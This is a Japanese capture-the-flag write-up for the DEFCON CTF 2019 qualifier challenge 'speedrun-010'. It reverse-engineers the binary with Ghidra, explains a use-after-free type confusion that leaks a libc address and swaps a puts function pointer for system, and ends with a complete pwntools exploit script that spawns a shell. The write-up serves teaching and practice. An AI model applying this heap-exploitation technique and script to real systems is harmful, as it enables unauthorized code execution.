---
tags: pwn
---


# DEFCON CTF 2019 Qualifier - speedrun-010

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### outline

同じサイズのmallocであることを利用して指す先の構造が異なる2つのポインタが同じ箇所を指すようにし、片方の編集や読み取りによってもう片方の構造中の情報を読んだり関数ポインタを書き換えて想定外の関数を呼ぶ。

### binary

いつものchecksec

```
$ checksec speedrun-010
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

まさかのSpeedrun系問題でフル装備、libc leakに一苦労しそう。

主要部分のGhidraのデコンパイル結果は次の通り(`main_2`とかいうふざけた名前なのは見逃して欲しい)

```clike

void main_2(void)

{
  long lVar1;
  ssize_t sVar2;
  void *p_1;
  undefined8 *p_2;
  long in_FS_OFFSET;
  char buf;
  int count_2;
  int count_1;
  ssize_t read_res;
  long canary;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  count_2 = 0;
  count_1 = 0;
  while( true ) {
    please_selsect();
    sVar2 = read(0,&buf,1);
    if (sVar2 != 1) break;
    if (buf == '1') {
      if (5 < count_1) break;
      puts("Need a name");
      p_1 = malloc(0x30);
      read(0,(void *)((long)p_1 + 8),0x17);
      *(undefined *)((long)p_1 + 0x1f) = 0;
      *(code **)((long)p_1 + 0x20) = puts;
      *(void **)(&ptr1_list + (long)count_1 * 8) = p_1;
      count_1 = count_1 + 1;
    }
    else {
      if (buf == '2') {
        if (5 < count_2) break;
        puts("Need a message");
        p_2 = (undefined8 *)malloc(0x30);
        read(0,p_2 + 2,0x18);
        *(undefined *)(p_2 + 5) = 0;
        (**(code **)(*(long *)(&ptr1_list + (long)(count_1 + -1) * 8) + 0x20))
                  (*(long *)(&ptr1_list + (long)(count_1 + -1) * 8) + 8);
        *(code **)(p_2 + 1) = puts;
        (*(code *)p_2[1])(" says ");
        (*(code *)p_2[1])(p_2 + 2);
        (*(code *)p_2[1])(&DAT_00100cc0);
        *p_2 = *(undefined8 *)(&ptr1_list + (long)(count_1 + -1) * 8);
        *(undefined8 **)(&ptr2_list + (long)count_2 * 8) = p_2;
        count_2 = count_2 + 1;
      }
      else {
        if (buf == '3') {
          if (count_1 == 0) break;
          free(*(void **)(&ptr1_list + (long)(count_1 + -1) * 8));
        }
        else {
          if ((buf != '4') || (count_2 == 0)) break;
          free(*(void **)(&ptr2_list + (long)(count_2 + -1) * 8));
          count_2 = count_2 + -1;
        }
      }
    }
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

処理としては2つの構造体のようなものをmallocで確保したりfreeしたりしている。1つ目は確保時に名前を入力するよう促される。2つ目はメッセージを入力するよう促される。そこそこ複雑な処理をしているので順に見ていく。

#### 1. 名前の入力

まず0x30バイトの領域が確保され、続いて`read`で0x17バイト入力を促され、領域の0x8バイト目から格納される。そして0x1fバイト目にヌルバイトが付与される。
この時点でこの領域は次のようになっている。

```
0x00: ???
0x08: aa aa aa aa aa aa aa aa
0x10: bb bb bb bb bb bb bb bb
0x18: cc cc cc cc cc cc cc 00
0x20: 
```

そしてlibc中の`puts`のアドレスが0x20から書き込まれる。こうして次のような状態になる

```
0x00: ???
0x08: aa aa aa aa aa aa aa aa
0x10: bb bb bb bb bb bb bb bb
0x18: cc cc cc cc cc cc cc 00
0x20: <puts@libc> 
...
```

おそらく

```c;ike
struct name{
    long v;
    char name[0x18];
    void (*dump)(char*);
};
```
のような構造体を定義しているように思える。

最後にローカル変数`count_1`をインクリメントする。この変数は名前を格納している領域のインデックスになる。
グローバル変数`ptr1_list`で名前の構造体の配列を管理しており`ptr1_list[count_1]`で現在の名前の構造体のを指すポインタが得られる。

#### 2. メッセージの入力

1\.とあまり変わらないが、確保されて編集されるメモリの中身がちょっと異なる。
はじめに0x30バイト確保されるのは同じ、続いてreadで0x18バイトを標準入力から受け取り、0x10バイト目から書き込まれ、0x28バイト目にヌルバイトが書き込まれる。
この時点でこの領域は次のようになっている。

```
0x00: ???
0x08: ???
0x10: aa aa aa aa aa aa aa aa
0x18: bb bb bb bb bb bb bb bb
0x20: cc cc cc cc cc cc cc cc
0x28: 00 
```

さて、続いてローカル変数`count_1`に対応する名前の構造体を取ってくる。この構造体には`dump`という関数ポインタと`name`というメンバがあった。これを利用して`dump(name)`のようなことをしている。これで名前を管理している構造体中に保管された名前が出力される。
そして再び確保された領域への書き込みへ戻る。ここでは`0x08`バイト目に`puts`へのアドレスを入れている。

こうしてこの領域は次のようになる。
```
0x00: ???
0x08: <puts@libc>
0x10: aa aa aa aa aa aa aa aa
0x18: bb bb bb bb bb bb bb bb
0x20: cc cc cc cc cc cc cc cc
0x28: 00 
```

ここも名前同様に出力用の関数と出力対象が書き込まれている。これを利用してこの出力対象を出力する。名前用の構造体という表現に対応してここで確保される領域をメッセージ用の構造体のように呼ぶ。

そして最後に`count_2`をインクリメントする。これも`count_1`とほとんど同じで`ptr2_list`というグローバル配列で管理されている。

#### 3. 名前のfree

`count_1`に対応する名前の構造体を指すポインタがfreeされる。但し、`count_1`がデクリメントされたり0クリアされたりしないことから2\. を実行することでUAF(read)が出来る(但し先頭8バイトは飛ばされる)。

#### 4. メッセージのfree

`count_2`に対応するメッセージの構造体を指すポインタがfreeされる。こちらは`count_2`をデクリメントする。

### 型の違いを利用したUAF

#### libc leak 

さて今回は固定サイズのmallocを行っていることから例えばある名前がfreeされてtcacheに入り、その直後にメッセージをmallocすると先程まで名前だった領域がメッセージとして確保されることになる。ここで両者の構造を比べてみる(左が名前で右がメッセージ)。

```
0x00: ???                     | ???
0x08: aa aa aa aa aa aa aa aa | <puts@libc>
0x10: bb bb bb bb bb bb bb bb | dd dd dd dd dd dd dd dd
0x18: cc cc cc cc cc cc cc 00 | ee ee ee ee ee ee ee ee
0x20: <puts@libc>             | ff ff ff ff ff ff ff ff
0x28: ???                     | 00
```

freeされると`fd`メンバが書き込まれるがそれ以外は特に書き込みが行われない、よって名前として確保された領域の0x08以降は特に変更されないままメッセージとしてmallocされる。よってメッセージの`puts@libc`を書き込む直前の様子は次のようになる

```
0x00: ???
0x08: aa aa aa aa aa aa aa aa
0x16: dd dd dd dd dd dd dd dd
0x18: ee ee ee ee ee ee ee ee
0x20: ff ff ff ff ff ff ff ff <- old puts@libc
0x28: 00
```

0x20バイト目に注目するとここは元々`puts@libc`が入っていたので入力を0x1fバイト目までに留めておけば続く名前の表示の際にoverreadでlibcリークが狙えそうである。

#### 関数ポインタの書き換え

さてlibc leakが出来たのであとはシェルをどう取るかだが2\.で書き込みを行った直後に名前の構造体中の関数ポインタで示す先(通常は`puts`)が呼ばれている事に注目するとここを`system`に書き換えると面白いことが起こりそうである。
先程同様に名前の構造体をfreeしてメッセージとして再確保すると`count_1`がデクリメントされないことからメッセージ書き込み時に部分的にUAF(書き込み)も出来る。
メッセージ書き込み直後の`count_1`に対応する名前の構造体の中身は次のようになっている

```
0x00: ???
0x08: aa aa aa aa aa aa aa aa
0x16: dd dd dd dd dd dd dd dd
0x18: ee ee ee ee ee ee ee ee
0x20: ff ff ff ff ff ff ff ff <- (name->dump)
0x28: 00
```

0x20バイト目の値がdumpに相当することからここを書き換えればdumpが呼ばれた際に任意アドレスへ飛ばすことができそうである。既にlibcリークは済んでいたのでputsからsystemにすると`system("\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa...")`が呼ばれることになる。
ということは名前をfreeする前に名前を`"/bin/sh"`にしておき、その後にdumpを書き換えるとシェルが起動する。

## Code

```python
from pwn import process, p64, u64, ELF


def _select(s, sel, c="1, 2, 3, 4, or 5\n"):
    s.recvuntil(c)
    s.send(sel)


def set_p1(s, data=b"junk"):
    _select(s, b"1")
    s.recvuntil(b"Need a name\n")
    s.send(data)


# show p1_list[count_1]
def set_p2(s, data=b"junk"):
    _select(s, b"2")
    s.recvuntil(b"Need a message\n")
    s.send(data)


# free p1_list[count_1]
def free_p1(s):
    _select(s, b"3")


# free p2_list[count_2] & count_2 -= 1
def free_p2(s):
    _select(s, b"4")


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        ptr1: double free 可能, UAF(0x8以降の読み取りのみ)
    """
    s = process("./speedrun-010")
    elf = ELF("./speedrun-010")
    libc = ELF("./libc-2.27.so")
    puts_libc = libc.symbols["puts"]
    system_libc = libc.symbols["system"]

    # count = (1, 0)
    set_p1(s)
    free_p1(s)
    junk = b"junkjunkjunkjunk"
    # count = (1, 1)
    set_p2(s, junk)
    s.recvuntil(junk)
    libc_base = u64(s.recv(6).ljust(8, b"\x00")) - puts_libc
    print(hex(libc_base))

    system_addr = libc_base + system_libc
    # count = (2, 1)
    set_p1(s, b"/bin/sh")
    free_p1(s)
    # count = (2, 2)
    set_p2(s, junk + p64(system_addr))
    s.interactive()

```

## Flag

ローカルでシェル取っただけなので無いです

## 感想

Ghidraデコンパイル解読に慣れてきた。
多分puts@libcを読むんだろうというところまでは閃いたが同じサイズの領域をfreeしてmallocすると同じ領域が返ることになかなか気付かず苦戦した。
サイズ固定mallocなら再mallocした際に以前確保されていた際の情報が残っている事は頭に入れておきたい